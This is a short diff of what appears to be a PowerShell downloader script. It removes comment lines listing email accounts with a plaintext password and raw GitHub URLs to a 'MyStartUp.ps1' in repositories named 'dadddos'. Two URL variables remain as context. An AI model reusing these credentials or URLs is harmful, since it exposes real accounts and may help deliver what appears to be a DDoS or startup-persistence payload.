@@ -1,16 +1,3 @@
-#caminobarato@gmail.com
-#kalipro123kalipro123
-#https://raw.githubusercontent.com/fullcaleta/dadddos/main/MyStartUp.ps1
-#jonathansalinas8888@outlook.com
-#kalipro123kalipro123
-#https://raw.githubusercontent.com/fullcaletaxDacc27/dadddos/main/MyStartUp.ps1
-
-#######################################################################################
-## cuenta no creada							           ####
-## cuentadeprueba231jj22@outlook.com     					   ####
-## kalipro123kalipro123								   ####	
-## https://raw.githubusercontent.com/fullcaletaxxxhd/daddddddos/main/MyStartUp.ps1 ####
-#######################################################################################
 
 $downloadUrl = "https://raw.githubusercontent.com/fullcaleta/dadddos/main/MyStartUp.ps1"
 $down = "https://raw.githubusercontent.com/fullcaletaxDacc27/dadddos/main/MyStartUp.ps1"
